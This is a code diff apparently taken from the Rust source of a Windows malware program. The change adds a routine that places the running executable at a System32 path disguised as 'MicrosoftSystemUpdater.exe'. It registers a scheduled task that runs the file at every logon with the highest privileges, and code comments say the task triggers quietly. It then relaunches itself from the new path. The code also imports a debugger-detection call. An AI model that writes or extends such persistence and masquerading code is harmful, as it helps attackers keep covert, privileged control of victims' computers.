@@ -6,7 +6,7 @@ use std::sync::Mutex;
 use once_cell::sync::Lazy;
 use std::io::Write;
 use crate::encode::{self, Encode};
-use std::path::PathBuf;
+use std::path::{Path, PathBuf};
 use rand::{rngs::StdRng, SeedableRng, Rng};
 use windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
 
@@ -311,19 +311,36 @@ fn ansi_to_string(bytes: &[i8]) -> String {
 }
 
 pub fn add_sheduled_task(){
-    let task_name = "MicrosoftSystemUpdater";
+    
     let task_path = std::env::current_exe().expect("Can't find");
+
+
+}
+
+pub fn mv_file(){
+
+    let curr_file = std::env::current_exe().expect("Can't find");
+    let new_file = std::path::Path::new("C:\\Windows\\System32\\MicrosoftSystemUpdater.exe");
+    
+    if new_file != curr_file{
+
+        let task_name = "MicrosoftSystemUpdater";
 
         let output = std::process::Command::new("schtasks")
         .args(&[
             "/Create",
             "/SC", "ONLOGON",                    // triggers quietly on user login
             "/TN", task_name,
-            "/TR", task_path.to_str().unwrap(),
+            "/TR", new_file.to_str().unwrap(),
             "/RL", "HIGHEST",                    // run with admin rights
             "/F",                                // force create
         ])
         .output()
         .expect("failed to run schtasks");
 
+        std::process::Command::new(new_file).spawn().unwrap();
+
+        std::process::exit(0);
+
+    }
 }
